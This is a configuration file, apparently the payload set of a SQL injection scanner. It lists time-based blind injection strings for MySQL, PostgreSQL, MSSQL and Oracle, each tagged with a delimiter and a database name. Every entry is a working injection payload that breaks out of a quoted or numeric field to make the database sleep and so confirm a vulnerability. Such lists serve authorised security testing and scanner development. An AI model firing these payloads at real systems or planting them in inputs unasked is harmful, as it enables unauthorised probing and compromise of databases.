[DEFAULT]
payload = None
delimiter = None
language = ""

# ==== Delay Payloads: GIỮ NGUYÊN ====
[delay_mysql_sleep_single_quote]
payload = ' OR SLEEP(5) -- 
delimiter = '
language = MySQL

[delay_mysql_sleep_double_quote]
payload = " OR SLEEP(5) -- 
delimiter = "
language = MySQL

[delay_mysql_sleep_comment]
payload = ' OR 1=1 /* SLEEP(5) */ -- 
delimiter = '
language = MySQL

[delay_postgres_pg_sleep_semicolon]
payload = '; SELECT pg_sleep(5); -- 
delimiter = ;
language = PostgreSQL

[delay_postgres_pg_sleep_single_quote]
payload = ' OR pg_sleep(5) -- 
delimiter = '
language = PostgreSQL

[delay_mssql_waitfor_delay_single_quote]
payload = ' WAITFOR DELAY ''0:0:5'' -- 
delimiter = '
language = MSSQL

[delay_mssql_if_condition_true]
payload = ' IF (1=1) WAITFOR DELAY ''0:0:5'' -- 
delimiter = '
language = MSSQL

[delay_oracle_dbms_pipe_receive]
payload = ' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(''a'',5) -- 
delimiter = '
language = Oracle

[delay_oracle_dbms_lock_sleep]
payload = ' OR 1=1 AND DBMS_LOCK.SLEEP(5) -- 
delimiter = '
language = Oracle

[delay_mysql_numeric_sleep]
payload = 1 AND SLEEP(5) -- 
delimiter =
language = MySQL

[delay_mysql_numeric_if_sleep]
payload = IF(1=1,SLEEP(5),0) -- 
delimiter =
language = MySQL

[delay_postgres_numeric_pg_sleep]
payload = 1 AND pg_sleep(5) -- 
delimiter =
language = PostgreSQL

[delay_postgres_numeric_select_sleep]
payload = 1; SELECT pg_sleep(5) -- 
delimiter = ;
language = PostgreSQL

[delay_mssql_numeric_waitfor]
payload = 1; WAITFOR DELAY '0:0:5' -- 
delimiter = ;
language = MSSQL

[delay_mssql_numeric_if_waitfor]
payload = 1; IF (1=1) WAITFOR DELAY '0:0:5' -- 
delimiter = ;
language = MSSQL

[delay_oracle_numeric_dbms_lock]
payload = 1 AND DBMS_LOCK.SLEEP(5) -- 
delimiter =
language = Oracle

[delay_oracle_numeric_dbms_pipe]
payload = 1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) = 0 -- 
delimiter =
language = Oracle

